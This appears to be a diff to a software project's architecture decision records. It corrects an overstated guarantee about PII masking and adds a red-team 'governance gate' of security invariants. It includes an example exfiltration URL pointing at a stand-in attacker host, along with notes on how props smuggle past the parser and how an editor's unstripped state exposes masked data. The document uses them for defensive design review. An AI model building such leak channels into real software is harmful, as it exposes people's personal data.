@@ -102,7 +102,8 @@ in the *test*, not the code — which is exactly its job.
 
 ## ADR-003 — Governance is enforced by ORDERING: `stripDocument` destroys, then `Render` renders
 
-**Status:** accepted. This is the constraint every AQL 1.0 feature must preserve.
+**Status:** ⚠️ **CORRECTED — the original guarantee was overstated.** See the correction at the end of this ADR.
+The ordering rule stands; the claim that it is sufficient does not.
 
 ### Context
 The product's differentiator is that no other visual builder enforces per-node governance at egress. If state,
@@ -240,3 +241,79 @@ The rule, binding on `aql-language-designer` and `aql-runtime-engineer`:
    test, not assumed.
 3. `lint()` gains a rule: warn when a `pii`/`protected`/`roles`-gated node writes to state.
 4. If node-scoped state is ever introduced, `maskNode` masks it exactly as it masks props.
+
+### ⚠️ CORRECTION (added after red-team review)
+
+**The claim "an expression cannot read what does not exist" is CONDITIONAL, and I stated it as absolute.**
+
+It holds only when the expression scope contains the *stripped* document. **An editor holds the UNSTRIPPED
+document by definition** — that is what it is editing. The moment the composer does
+`render-document document={{state.doc}}`, the authoring document is in an expression scope:
+
+```
+render path:  stripDocument(doc, {canViewPii:false}).root[0].props.text  →  "•••••"
+editor state: evalExpr("state.doc.root[0].props.text", {state:{doc}})    →  "SSN 123-45-6789"
+```
+
+Reproduced against published `@noidmejs/atomkit`. The mask is destructive, but destruction happens on a *copy*;
+the original is still in the editor's hand.
+
+`composer-test-engineer` caught this, and `composer-tech-lead` reproduced it independently. It was found because
+the AQL 1.0 charter's security proof leaned on this ADR. Had the proof not been red-teamed, the composer would
+have shipped a governance bypass in its own preview pane.
+
+**The corrected rule:** ordering is *necessary* but not *sufficient*. The runtime must additionally guarantee
+**strip-before-scope** — every expression scope is built from the stripped document — and **state must be
+literal-only**, so a governed value can never be captured into it. Enforcement moves to the gate below.
+
+Two further consequences of §3 and §4 above were also found to be **wrong**:
+
+- §3 said actions "must route through" the SSRF allow-list, implying `safeHref` helps. It does not. `safeHref`
+  blocks **schemes** (`javascript:`, `data:`, `//host`), never **destinations**:
+  `safeHref("https://attacker.io/?d=SSN")` returns the URL unchanged. A `navigate` verb is an exfiltration
+  channel that `safeHref` cannot see.
+- ADR-005's reliance on schema strictness was over-broad: `props` is an open `z.record` by design, so
+  `props.state` and `props["on:click"]` smuggle straight through `parseDocument`. Strictness guards node-level
+  keys, not the props bag. (`maskNode`'s deny-by-default now drops them at egress — but that is a *second* line,
+  not the first.)
+
+---
+
+## ADR-006 — The governance gate: no interactivity ships until it is green
+
+**Status:** accepted and enforced. `spike/governance-gate.mjs`. **Currently 5 held, 3 OPEN — exit code 1.**
+
+### Why
+The AQL 1.0 design review produced six designs. The red team marked **four of six UNSOUND**, found **23 false
+claims** — assertions about atomkit that nobody had executed — and raised **15 security holes**. One was a live
+bug in published `0.7.0` (`maskNode` spread unknown node-level fields; fixed, ADR-005 §updated). Another refuted
+this repo's own ADR-003.
+
+The lesson is not that the designers were careless. It is that **a security argument nobody executed is not a
+security argument.** So the gate is executable.
+
+### The gate
+`node spike/governance-gate.mjs` exits non-zero while any invariant is open. No `state`, no `on:`, no action verb
+lands in the runtime until it exits 0.
+
+| | Invariant | Status | Owner |
+|---|---|---|---|
+| G1 | `stripDocument` masks PII before render | ✅ held | — |
+| G2 | an expression cannot read PII held in state | ❌ **open** | `aql-runtime-engineer`, `aql-security-engineer` |
+| G3 | a node-level `state` field does not survive masking | ✅ held *(closed by the ADR-005 fix)* | — |
+| G4 | interactive concepts hidden in `props` do not survive masking | ✅ held *(closed by the same fix)* | — |
+| G5 | a `navigate` target cannot carry data to an arbitrary host | ❌ **open** | `aql-security-engineer` |
+| G6 | an unquoted `{{expr}}` does not silently become empty | ❌ **open** | `aql-language-designer` |
+| G6b | a quoted `"{{expr}}"` survives the parser intact | ✅ held | — |
+| G7 | expression roots are constrained by the host, not the grammar | ✅ held (informational) | — |
+
+G7 is worth stating plainly, because a design leaned on its opposite: **`parseExpr` has no root allowlist, by
+design.** The host defines the scope, and the scope *is* the security boundary. Any safety proof that assumes the
+grammar restricts roots is relying on a rule that does not exist.
+
+G6 is a silent-data-loss bug that predates AQL 1.0: `box document={{state.doc}}` does not error. `{` opens a
+block, so the value parses to the empty string. Silence is worse than a throw.
+
+### The rule this encodes
+G3 and G4 were **open when the red team found them, and are held now** — because the fix landed within the hour.
+That is the loop. A gate is only useful if it is executable, if it is run, and if red means stop.
